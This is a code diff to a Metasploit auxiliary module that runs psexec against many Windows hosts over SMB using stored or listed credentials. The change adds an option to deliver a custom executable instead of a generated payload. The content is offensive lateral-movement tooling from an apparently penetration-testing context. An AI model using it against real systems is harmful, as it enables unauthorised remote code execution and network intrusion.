@@ -18,6 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Report
+	include Msf::Exploit::EXE
 	
 	
 	def initialize(info={})
@@ -50,6 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('OPTIONS',
 				[false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
 					""]),
+				OptString.new('EXE::Custom', [false, 'Use custom exe instead of automatically generating a payload exe', nil]),
 				OptBool.new('HANDLER',
 					[ false, 'Start an Exploit Multi Handler to receive the connection', true]),
 			], self.class)
@@ -63,6 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 		lhost    = datastore['LHOST']
 		lport    = datastore['LPORT']
 		opts     = datastore['OPTIONS']
+		
 
 		if datastore['TYPE'] == "db"
 			print_status("Using the credentials found in the workspace database")
@@ -83,8 +86,9 @@ class Metasploit3 < Msf::Auxiliary
 					pass = datastore['SMBPass']
 					dom = datastore['SMBDomain']
 					payload = datastore['PAYLOAD']
+					custexe = datastore['EXE::Custom']
 					print_status("Trying #{user}:#{pass}")
-					psexec(ip,user,pass,dom,payload)
+					psexec(ip,user,pass,dom,payload,custexe)
 					return
 				end
 			else
@@ -92,8 +96,9 @@ class Metasploit3 < Msf::Auxiliary
 					user,pass = c.split(" ")
 					dom = datastore['SMBDomain']
 					payload = datastore['PAYLOAD']
+					custexe = datastore['EXE::Custom']
 					print_status("Trying #{user}:#{pass}")
-					psexec(ip,user,pass,dom,payload)
+					psexec(ip,user,pass,dom,payload,custexe)
 				end
 			end
 		else
@@ -102,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 	
 	## Run psexec on a given IP
-	def psexec(ip,user,pass,dom,payload)
+	def psexec(ip,user,pass,dom,payload,custexe)
 		psexec = framework.modules.create("exploit/windows/smb/psexec")
 		psexec.share_datastore(@pay.datastore)
 		psexec.datastore['PAYLOAD'] = payload
@@ -112,6 +117,9 @@ class Metasploit3 < Msf::Auxiliary
 		psexec.datastore['SMBUser'] = user
 		psexec.datastore['SMBPass'] = pass
 		psexec.datastore['SMBDomain'] = dom
+		if not datastore['EXE::Custom'].nil?
+			psexec.datastore['EXE::Custom'] = custexe
+		end
 		psexec.datastore['SHARE'] = datastore['SHARE']
 		psexec.datastore['RPORT'] = 445
 		psexec.datastore['ExitOnSession'] = false
